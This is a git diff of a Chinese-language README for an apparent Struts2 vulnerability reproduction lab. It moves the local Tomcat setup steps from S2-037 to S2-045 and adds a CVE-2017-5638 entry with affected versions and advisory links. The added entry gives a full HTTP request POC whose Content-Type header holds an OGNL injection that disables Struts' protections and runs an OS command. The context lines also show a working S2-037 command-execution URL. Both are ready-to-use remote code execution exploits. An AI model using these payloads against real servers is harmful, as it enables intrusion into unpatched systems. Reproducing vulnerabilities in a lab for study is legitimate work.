@@ -10,14 +10,14 @@ git branch -a
 
 3.切换到分支
 git checkout 分支名
-如git checkout S2-037
+如git checkout S2-045
 
 4.打包
 mvn clean package
 
 5.部署在Tomcat中
-将\target中生成的Struts2-037.war复制到Tomcat下的webapps目录中，然后开启Tomcat
-访问http://127.0.0.1:8080/Struts2-037/orders/3
+将\target中生成的Struts2-045.war复制到Tomcat下的webapps目录中，然后开启Tomcat
+访问http://127.0.0.1:8080/Struts2-045/index.action
 
 # 相关信息
 
@@ -110,3 +110,26 @@ CVE-2016-4438
 
 POC:
 http://127.0.0.1:8080/Struts2-037/orders/3/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=whoami
+
+
+9.S2-045
+
+CVE-2017-5638
+
+影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10
+
+官方公告：暂无
+http://struts.apache.org/docs/s2-045.html
+https://cwiki.apache.org/confluence/display/WW/S2-045
+
+POC:
+
+POST /Struts2-045/index.action HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+Content-Length: 2
